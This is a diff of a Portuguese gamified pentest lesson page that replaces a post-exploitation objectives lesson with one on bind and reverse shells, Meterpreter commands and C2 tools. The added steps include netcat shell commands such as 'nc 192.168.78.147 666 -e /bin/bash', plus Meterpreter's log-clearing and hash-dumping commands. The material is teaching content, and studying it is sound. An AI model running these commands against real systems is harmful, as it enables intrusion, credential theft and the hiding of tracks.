@@ -9,7 +9,7 @@
     <link rel="dns-prefetch" href="https://fonts.googleapis.com">
     <link rel="dns-prefetch" href="https://fonts.gstatic.com">
     <link rel="dns-prefetch" href="https://cdnjs.cloudflare.com">
-    <title>CyberDuo - Executando Técnicas de Pós-Exploração</title>
+    <title>CyberDuo - Canal de Acesso: Shells e Utilitários C2</title>
     <link rel="icon" type="image/svg+xml" href="../assets/favicon.svg">
     <link rel="stylesheet" href="../assets/tailwind.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -131,39 +131,113 @@
         const steps = [
             {
                         "type": "teach",
-                        "icon": "fa-flag",
-                        "title": "Objetivos da Pós-Exploração (Cisco 8.0.1)",
-                        "content": "Em um teste de penetração, o objetivo final vai muito além de apenas encontrar vulnerabilidades. Após comprometer uma máquina alvo, a fase de <b>Pós-Exploração</b> serve para avaliar o risco de perdas potenciais que o cliente sofreria se um atacante real invadisse o sistema.<br><br>🛡️ Esta fase demonstra na prática até onde o invasor pode penetrar na rede interna e a quais dados confidenciais ele teria acesso total.",
-                        "highlight": "Na pós-exploração, você prova o impacto financeiro e operacional de uma invasão real!"
+                        "icon": "fa-terminal",
+                        "title": "O que é um Shell? (Cisco 8.1.2)",
+                        "content": "Um <b>shell</b> é o software que serve de interface entre o usuário e o kernel do Sistema Operacional. No Linux, temos shells como <b>Bash, KSH e TCSH</b>. No Windows, o clássico é o CMD (`cmd.exe`) ou o moderno <b>PowerShell</b> (que combina scripts, cmdlets e administração avançada).<br><br>Durante um pentest, precisamos trazer essa linha de comando do alvo de volta ao nosso computador para gerenciar o sistema comprometido.",
+                        "highlight": "Shells permitem executar comandos diretamente no sistema operacional do alvo."
             },
             {
                         "type": "teach",
-                        "icon": "fa-clock",
-                        "title": "Medindo o Tempo de Detecção (Cisco 8.0.1)",
-                        "content": "Outro objetivo crucial da pós-exploração é <b>avaliar a eficácia dos defensores</b> da organização (a equipe azul ou o SOC).<br><br>⏱️ Durante os testes, avalia-se quanto tempo a equipe de segurança leva para detectar as atividades suspeitas, identificar arquivos maliciosos e responder ao exploit. Isso ajuda a calibrar os sensores e alertas de intrusão do cliente.",
-                        "highlight": "Entrar sem ser detectado avalia a furtividade e a competência de monitoramento do SOC!"
+                        "icon": "fa-circle-dot",
+                        "title": "Bind Shell: Aguardando a Conexão (Cisco 8.1.2)",
+                        "content": "Em um <b>Bind Shell</b>, o atacante executa um backdoor na máquina da vítima que abre uma porta de rede e fica <b>escutando</b> (aguardando conexão). O atacante então inicia a conexão de fora e assume o controle.<br><br>⚠️ <b>Principal Desafio</b>: Se a vítima estiver atrás de um firewall ou NAT, a porta de escuta será bloqueada e o atacante não conseguirá se conectar.",
+                        "highlight": "Bind Shell = Vítima escuta a porta e o atacante se conecta."
+            },
+            {
+                        "type": "example",
+                        "icon": "fa-terminal",
+                        "title": "Prática - Bind Shell com Netcat (Cisco 8.1.3)",
+                        "scenario": "Para criar um Bind Shell em um servidor Linux comprometido (192.168.78.6) usando a ferramenta Netcat, o pentester executa a escuta na porta 1234 direcionando para o Bash:",
+                        "code": "omar@jorel:~$ nc -lvp 1234 -e /bin/bash\nlistening on [any] 1234 ...",
+                        "takeaway": "No sistema do atacante, basta conectar no IP do alvo: 'nc -nv 192.168.78.6 1234' para ganhar o shell."
+            },
+            {
+                        "type": "teach",
+                        "icon": "fa-arrows-split-up-and-left",
+                        "title": "Reverse Shell: Burlado Firewalls (Cisco 8.1.2)",
+                        "content": "No <b>Reverse Shell (Shell Reverso)</b>, o processo é invertido: o <b>atacante</b> abre um ouvinte na sua própria máquina e a <b>vítima</b> inicia a conexão de dentro para fora, apontando para o IP do invasor.<br><br>🚀 <b>Grande Vantagem</b>: Como a conexão começa de dentro da rede corporativa para a internet, a maioria das políticas de firewall permite a saída, contornando proteções externas de entrada.",
+                        "highlight": "Reverse Shell = Atacante escuta a porta e a vítima se conecta de volta a ele."
+            },
+            {
+                        "type": "example",
+                        "icon": "fa-terminal",
+                        "title": "Prática - Reverse Shell com Netcat (Cisco 8.1.3)",
+                        "scenario": "O atacante abre um listener em sua máquina (192.168.78.147) na porta 666 e força o servidor da vítima a se conectar de volta:",
+                        "code": "# 1. Na máquina do atacante:\n$ nc -lvp 666\n\n# 2. Na máquina da vítima:\n$ nc 192.168.78.147 666 -e /bin/bash",
+                        "takeaway": "A conexão de saída da vítima dá ao atacante controle imediato via terminal na porta 666."
             },
             {
                         "type": "quiz",
-                        "task": "De acordo com as boas práticas da Cisco, qual é um objetivo essencial ao executar atividades de pós-exploração em um pentest?",
+                        "task": "Por que o Shell Reverso (Reverse Shell) é muito mais eficaz do que o Bind Shell em cenários de pentests reais?",
                         "options": [
-                                    "Avaliar o tempo que leva o pessoal de segurança (SOC) para descobrir e responder ao exploit.",
-                                    "Causar danos físicos irreparáveis para forçar a empresa a comprar novos hardwares.",
-                                    "Instalar softwares de mineração de bitcoin ocultos para financiar o projeto."
+                                    "Porque ele inicia a conexão de dentro para fora da rede, contornando as restrições de firewall que barram conexões de entrada.",
+                                    "Porque ele consome menos largura de banda e criptografa nativamente em AES-256.",
+                                    "Porque ele não exige a instalação do utilitário Netcat ou do utilitário Bash."
                         ],
-                        "correctText": "Avaliar o tempo que leva o pessoal de segurança (SOC) para descobrir e responder ao exploit.",
-                        "explanation": "Testar a capacidade de resposta e detecção do SOC ajuda a calibrar sistemas de alarmes e otimizar processos de incidentes da empresa."
+                        "correctText": "Porque ele inicia a conexão de dentro para fora da rede, contornando as restrições de firewall que barram conexões de entrada.",
+                        "explanation": "A maioria dos firewalls de borda bloqueia qualquer conexão vinda de fora (Bind), mas permite que servidores internos façam conexões para a internet (Reverso)."
+            },
+            {
+                        "type": "match",
+                        "title": "Comandos Meterpreter (Cisco Tabela 8-3)",
+                        "pairs": [
+                                    {
+                                                "term": "lpwd",
+                                                "definition": "Exibe o diretório local no sistema de ataque"
+                                    },
+                                    {
+                                                "term": "clearev",
+                                                "definition": "Limpa os logs de aplicativo, sistema e segurança"
+                                    },
+                                    {
+                                                "term": "hashdump",
+                                                "definition": "Extrai as senhas criptografadas do banco SAM (Windows)"
+                                    },
+                                    {
+                                                "term": "recurso",
+                                                "definition": "Executa comandos Meterpreter listados em arquivo de texto"
+                                    }
+                        ]
+            },
+            {
+                        "type": "teach",
+                        "icon": "fa-server",
+                        "title": "Sistemas de Comando e Controle - C2 (Cisco 8.1.4)",
+                        "content": "Atacantes avançados utilizam estruturas de <b>Comando e Controle (C2 / CnC)</b> para gerenciar sistemas invadidos. O C2 cria um <b>canal encoberto (covert channel)</b> para transferir dados de forma secreta sem levantar alertas nas políticas de segurança da rede.<br><br>Ativos de C2 podem ser servidores em nuvem, hosts comprometidos intermediários ou até tráfego disfarçado em redes sociais (Twitter, Dropbox).",
+                        "highlight": "TrevorC2 e DNSCat2 são exemplos clássicos de C2 focados em evasão."
+            },
+            {
+                        "type": "match",
+                        "title": "Ferramentas e Utilitários C2 (Cisco 8.1.4)",
+                        "pairs": [
+                                    {
+                                                "term": "WMImplant",
+                                                "definition": "Baseado em PowerShell, usa WMI como canal C2"
+                                    },
+                                    {
+                                                "term": "DNSCat2",
+                                                "definition": "Cria canais encobertos criptografados usando DNS"
+                                    },
+                                    {
+                                                "term": "TrevorC2",
+                                                "definition": "Evasivo baseado em Python, disfarça comandos como HTTP"
+                                    },
+                                    {
+                                                "term": "Twittor",
+                                                "definition": "Usa mensagens diretas de redes sociais para emitir comandos"
+                                    }
+                        ]
             },
             {
                         "type": "fill",
-                        "sentence": "Após a invasão inicial, o testador executa atividades de pós-exploração para mover-se lateralmente e manter a ___ permanente no sistema comprometido.",
+                        "sentence": "No Netcat, também conhecido como a faca suíça do TCP/IP, o parâmetro ___ é usado para redirecionar e executar a shell após a conexão ser fechada.",
                         "options": [
-                                    "persistência",
-                                    "criptografia",
-                                    "desconexão"
+                                    "-e",
+                                    "-l",
+                                    "-p"
                         ],
-                        "correctText": "persistência",
-                        "explanation": "A persistência garante que o acesso seja mantido mesmo após reboots do servidor, permitindo demonstrar o impacto de longo prazo."
+                        "correctText": "-e",
+                        "explanation": "O parâmetro '-e' (exec) instrui o Netcat a redirecionar as entradas e saídas do executável (/bin/bash ou cmd.exe) diretamente para a conexão de rede."
             }
 ];
 
@@ -445,7 +519,7 @@
             document.getElementById('progressFill').style.width = `100%`;
             document.getElementById('footerArea').classList.add('hidden');
             
-            let nextBtnHtml = `<button class="check-btn active w-full" onclick="window.location.href='../lessons/8.1a-shells-c2.html'" style="background: var(--cyber-green); color: black; border-color: var(--cyber-green); box-shadow: 0 4px 0 #008f20; font-size: 1.1rem; padding: 1.2rem; letter-spacing: 2px;">PRÓXIMA LIÇÃO <i class="fas fa-arrow-right ml-2"></i></button>`;
+            let nextBtnHtml = `<button class="check-btn active w-full" onclick="window.location.href='../lessons/8.1b-persistencia-avancada.html'" style="background: var(--cyber-green); color: black; border-color: var(--cyber-green); box-shadow: 0 4px 0 #008f20; font-size: 1.1rem; padding: 1.2rem; letter-spacing: 2px;">PRÓXIMA LIÇÃO <i class="fas fa-arrow-right ml-2"></i></button>`;
             if (nextBtnHtml.includes("##NEXT_LESSON_BTN" + "##")) {
                 nextBtnHtml = `<button class="check-btn active w-full" onclick="window.location.href='../lessons/1.0-introducao.html'" style="background: var(--cyber-green); color: black; border-color: var(--cyber-green); box-shadow: 0 4px 0 #b3002a; font-size: 1.1rem; padding: 1.2rem; letter-spacing: 2px;">PRÓXIMA LIÇÃO <i class="fas fa-arrow-right ml-2"></i></button>`;
             }
@@ -453,7 +527,7 @@
             document.getElementById('gameArea').innerHTML = `
                 <div class="game-card teach-card" style="align-items: center; text-align: center; border-color: var(--cyber-blue)">
                     <i class="fas fa-medal text-6xl text-yellow-400 mb-4 mt-4"></i>
-                    <h2 class="title-main mb-2">Você compreendeu a base pedagógica e os objetivos reais de pós-exploração no pentest!</h2>
+                    <h2 class="title-main mb-2">Você dominou o uso de Netcat, Meterpreter e compreendeu o funcionamento estratégico dos servidores C2!</h2>
                     <p class="text-body mb-6">Você completou esta lição com sucesso!</p>
                     <div style="display: flex; flex-direction: column; gap: 1rem; width: 100%; align-items: center; margin-top: 1rem;">
                         ${nextBtnHtml}
